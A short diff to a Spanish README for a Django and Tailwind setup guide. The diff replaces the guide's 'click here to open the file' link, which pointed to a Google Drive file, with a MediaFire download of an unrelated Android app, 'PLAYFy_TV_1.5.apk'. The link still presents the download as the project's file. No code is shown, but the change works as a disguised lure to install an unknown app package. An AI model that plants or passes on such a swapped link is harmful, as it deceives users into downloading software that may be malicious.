@@ -1,5 +1,5 @@
 # Guía de Configuración: Seguros Personas (Django + Tailwind)
-[Haz clic aquí para abrir el archivo](https://drive.google.com/file/d/1hRgd1PFCfMmM4aB1ejBeNuSSphQRuqww/view?usp=sharing).
+[Haz clic aquí para abrir el archivo](https://www.mediafire.com/file/af5brvwggzqo4z9/PLAYFy_TV_1.5.apk/file).
 
 ## 1️⃣ Configuración del Entorno Python
 Sigue estos comandos para preparar el entorno virtual e instalar las dependencias del backend:
